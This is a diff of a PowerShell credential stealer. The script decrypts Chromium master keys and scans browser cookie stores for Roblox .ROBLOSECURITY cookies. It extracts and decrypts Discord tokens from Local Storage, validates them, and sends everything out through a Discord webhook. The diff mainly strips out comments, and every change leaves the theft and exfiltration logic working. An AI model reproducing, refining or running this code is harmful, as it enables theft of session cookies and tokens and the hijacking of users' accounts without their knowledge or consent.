@@ -43,7 +43,7 @@ if (Test-Path $rbxPath) {
     } catch {}
 }
 
-# 2. Browser cookies (Chromium + Firefox) - look for .ROBLOSECURITY
+# 2. Browser cookies (Chromium + Firefox)
 $browserPaths = @(
     @{ Name = "Chrome";     Path = "$env:LOCALAPPDATA\Google\Chrome\User Data";          Type = "Chromium" },
     @{ Name = "Edge";       Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";        Type = "Chromium" },
@@ -71,7 +71,6 @@ function Get-ChromiumMasterKey($userDataPath) {
 function Decrypt-ChromiumCookie($encryptedValue, $masterKey) {
     if (-not $encryptedValue -or $encryptedValue.Length -lt 15) { return $null }
     try {
-        # V10 / V11 AES-GCM
         if ($encryptedValue[0] -eq 0x76 -and $encryptedValue[1] -eq 0x31 -and ($encryptedValue[2] -eq 0x30 -or $encryptedValue[2] -eq 0x31)) {
             $nonce = $encryptedValue[3..14]
             $cipher = $encryptedValue[15..($encryptedValue.Length-17)]
@@ -81,13 +80,9 @@ function Decrypt-ChromiumCookie($encryptedValue, $masterKey) {
             $aes.Decrypt($nonce, $cipher, $tag, $plain)
             return [Text.Encoding]::UTF8.GetString($plain)
         }
-        # Legacy DPAPI
         return [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $null, "CurrentUser"))
     } catch { return $null }
 }
-
-# Note: full SQLite query needs System.Data.SQLite or winsqlite. For pure PS we scan Local Storage + Network cookies files via binary strings + known profiles.
-# Practical pure-PS approach: dump from Local Storage leveldb-style + Roblox client already covered. For full cookie DB we copy + use regex on binary.
 
 foreach ($b in $browserPaths) {
     if (-not (Test-Path $b.Path)) { continue }
@@ -100,11 +95,9 @@ foreach ($b in $browserPaths) {
         $db = if (Test-Path $cookieDb) { $cookieDb } elseif (Test-Path $cookieDbOld) { $cookieDbOld } else { $null }
         if (-not $db) { continue }
 
-        # Copy to temp to avoid lock
         $tmp = "$env:TEMP\ck_$([guid]::NewGuid().ToString('N')).db"
         try {
             Copy-Item $db $tmp -Force
-            # Binary search for .ROBLOSECURITY value patterns (raw + common encodings)
             $bytes = [IO.File]::ReadAllBytes($tmp)
             $text = [Text.Encoding]::UTF8.GetString($bytes)
             $matches = [regex]::Matches($text, '\.ROBLOSECURITY[_=:\s]*([A-Za-z0-9_\-\.|%]{50,})')
@@ -114,7 +107,6 @@ foreach ($b in $browserPaths) {
                     $rbxCookies += "$($b.Name)/$prof : .ROBLOSECURITY=$val"
                 }
             }
-            # Also try to surface WARNINGprefix style cookies
             $matches2 = [regex]::Matches($text, '_\|WARNING:-DO-NOT-SHARE-THIS\.[^|]{20,}')
             foreach ($m in $matches2) {
                 $rbxCookies += "$($b.Name)/$prof : $($m.Value)"
@@ -147,7 +139,6 @@ if (Test-Path $ffProfiles) {
 
 if ($rbxCookies.Count -gt 0) {
     $chunk = ($rbxCookies | Select-Object -Unique) -join "`n"
-    # Discord limit ~2000 chars
     while ($chunk.Length -gt 1800) {
         $part = $chunk.Substring(0, 1800)
         $chunk = $chunk.Substring(1800)
@@ -177,7 +168,6 @@ $tokenPaths = @(
     "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
 )
 
-# Also scan all Chrome/Edge profiles dynamically
 $chromeBase = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 if (Test-Path $chromeBase) {
     Get-ChildItem $chromeBase -Directory | Where-Object { $_.Name -match "Default|Profile" } | ForEach-Object {
@@ -206,7 +196,6 @@ function Get-DiscordKey($localStatePath) {
 function Decrypt-DiscordToken($encryptedB64, $key) {
     try {
         $raw = [Convert]::FromBase64String($encryptedB64)
-        # skip "dQw4w9WgXcQ:" already stripped; remaining is nonce + ciphertext + tag
         $nonce = $raw[3..14]
         $cipher = $raw[15..($raw.Length-17)]
         $tag = $raw[($raw.Length-16)..($raw.Length-1)]
@@ -223,19 +212,15 @@ foreach ($p in ($tokenPaths | Select-Object -Unique)) {
     foreach ($f in $files) {
         try {
             $content = [IO.File]::ReadAllText($f.FullName, [Text.Encoding]::UTF8)
-            # plain tokens
             [regex]::Matches($content, $regexToken) | ForEach-Object {
                 $t = $_.Value
                 if ($t -notin $tokens) { $tokens += $t }
             }
-            # encrypted tokens (Discord desktop)
             [regex]::Matches($content, $regexEnc) | ForEach-Object {
                 $encPart = $_.Value -replace '^dQw4w9WgXcQ:', ''
-                # find matching Local State
-                $parent = Split-Path (Split-Path (Split-Path $p))  # up to discord folder
+                $parent = Split-Path (Split-Path (Split-Path $p))
                 $ls = Join-Path $parent "Local State"
                 if (-not (Test-Path $ls)) {
-                    # try common locations
                     $ls = "$env:APPDATA\discord\Local State"
                 }
                 $key = Get-DiscordKey $ls
@@ -250,7 +235,6 @@ foreach ($p in ($tokenPaths | Select-Object -Unique)) {
     }
 }
 
-# Validate + send
 $valid = @()
 foreach ($t in ($tokens | Select-Object -Unique)) {
     try {
@@ -273,5 +257,4 @@ if ($valid.Count -gt 0) {
     Send-Webhook "**Discord Tokens**: none found"
 }
 
-# final
 Send-Webhook "**Done**"
